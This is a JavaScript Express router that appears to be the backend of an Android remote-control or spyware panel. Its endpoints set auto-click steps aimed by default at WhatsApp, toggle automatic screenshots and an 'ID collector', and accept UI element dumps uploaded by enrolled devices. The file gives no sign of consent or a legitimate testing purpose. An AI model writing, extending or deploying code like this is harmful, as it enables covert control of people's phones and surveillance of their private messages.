const express = require('express');
const db = require('../db');
const { requireSession, requireDevice } = require('../middleware/auth');

const router = express.Router();
const PKG_RE = /^[A-Za-z][A-Za-z0-9_]*(\.[A-Za-z][A-Za-z0-9_]*)+$/;
const ID_RE = /^[\w.\-]{1,64}$/;

router.get('/', requireSession, (req, res) => {
  res.json({
    autoClick: db.getAutoClick(),
    autoShot: db.getAutoShot(),
    idCollector: db.getIdCollector(),
  });
});

router.post('/', requireSession, (req, res) => {
  const body = req.body || {};

  let nextAutoClick = db.getAutoClick();
  let nextAutoShot = db.getAutoShot();
  let nextIdCollector = db.getIdCollector();

  if (body.autoClick && typeof body.autoClick === 'object') {
    const enabled = Boolean(body.autoClick.enabled);
    const rawPkg =
      typeof body.autoClick.targetPackage === 'string'
        ? body.autoClick.targetPackage.trim()
        : nextAutoClick.targetPackage;
    const pkg = rawPkg || 'com.whatsapp';

    if (pkg.length > 200 || !PKG_RE.test(pkg)) {
      return res.status(400).json({ error: 'invalid target package name' });
    }

    const rawSteps = Array.isArray(body.autoClick.steps) ? body.autoClick.steps : [];
    const cleanedSteps = [];
    for (let i = 0; i < 10; i++) {
      const val = typeof rawSteps[i] === 'string' ? rawSteps[i].trim() : '';
      if (val.length > 300) {
        return res.status(400).json({ error: `step ${i + 1} text too long` });
      }
      cleanedSteps.push(val);
    }

    nextAutoClick = db.setAutoClick({
      enabled,
      targetPackage: pkg,
      steps: cleanedSteps,
    });
  }

  if (body.autoShot && typeof body.autoShot === 'object') {
    nextAutoShot = db.setAutoShot(Boolean(body.autoShot.enabled));
  }

  if (body.idCollector && typeof body.idCollector === 'object') {
    nextIdCollector = db.setIdCollectorEnabled(Boolean(body.idCollector.enabled));
  }

  res.json({
    autoClick: nextAutoClick,
    autoShot: nextAutoShot,
    idCollector: nextIdCollector,
  });
});

router.post('/inspector', requireDevice, (req, res) => {
  const body = req.body || {};
  const deviceId = String(body.deviceId || '');
  if (!ID_RE.test(deviceId)) {
    return res.status(400).json({ error: 'invalid deviceId' });
  }
  if (!db.getIdCollector().enabled) {
    return res.json({ ok: true, ignored: true });
  }
  const pkg = String(body.package || '').slice(0, 200);
  const nodes = Array.isArray(body.nodes) ? body.nodes.slice(0, 80) : [];
  const updated = db.recordInspectorNodes(deviceId, pkg, nodes);
  res.json({ ok: true, idCollector: updated });
});

module.exports = router;
